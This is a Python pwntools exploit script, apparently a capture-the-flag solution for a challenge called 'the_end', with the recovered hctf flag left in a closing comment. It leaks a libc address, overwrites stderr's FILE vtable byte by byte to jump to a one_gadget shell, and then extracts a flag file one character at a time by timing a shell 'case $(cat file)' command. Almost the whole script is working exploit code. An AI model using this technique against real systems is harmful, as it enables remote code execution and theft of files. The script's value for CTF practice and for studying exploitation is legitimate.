from pwn import *

#r = process('./the_end', env={'LD_PRELOAD': './libc64.so'})
#r = remote('127.0.0.1', 1337)

def file_check_first_bytes(file, bytes, brute_timeout):

	context.log_level = 'ERROR'

	r = remote('150.109.44.250', 20002)
	#r.sendafter('Input your token:', 'your_token\n')

	def write_byte(addr, byte):
		r.send(p64(addr))
		r.send(chr(byte))

	libc = int(r.recvuntil(', good luck ;)\n').split(', good luck ;)\n')[0].split('0x')[1], 16) - 0xcc230

	log.success('Libc @ ' + hex(libc))

	stderr = libc + 0x3c5540
	fake_jump_table = libc + 0x3c44e0
	one_gadget = libc + 0xf02a4

	write_byte(stderr + 0x28, 0x1)

	write_byte(stderr + 0xd8 + 0x1, (fake_jump_table >> 8) & 0xff)

	write_byte(fake_jump_table + 0x18, one_gadget & 0xff)
	write_byte(fake_jump_table + 0x18 + 0x1, (one_gadget >> 8) & 0xff)
	write_byte(fake_jump_table + 0x18 + 0x2, (one_gadget >> 16) & 0xff)

	r.send('case $(cat ' + file + ') in "' + bytes + '"*) exit;; esac\n')

	try:
		r.recv(1, timeout=brute_timeout)
		context.log_level = 'INFO'
		return False
	except EOFError:
		context.log_level = 'INFO'
		return True


flag = ''
characters = 'abcdef0123456789}ghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_{'
brute_timeout = 1

print 'Bruteforcing flag byte by byte using these characters: ' + characters

while '}' not in flag:
	for c in characters:
		print c
		if file_check_first_bytes('./flag', flag + c, brute_timeout):
			if file_check_first_bytes('./flag', flag + c, brute_timeout):
				if file_check_first_bytes('./flag', flag + c, brute_timeout):
					if file_check_first_bytes('./flag', flag + c, brute_timeout):
						flag += c
						print 'Character found! New flag: ' + flag
						break
	else:
		print 'No character found. Increasing timeout by half a second.'
		brute_timeout += 0.5

#hctf{7d0d17ef6f9e74c4b63ffa3b6caaf94f512ea524f90cecdf1690ec8677950568}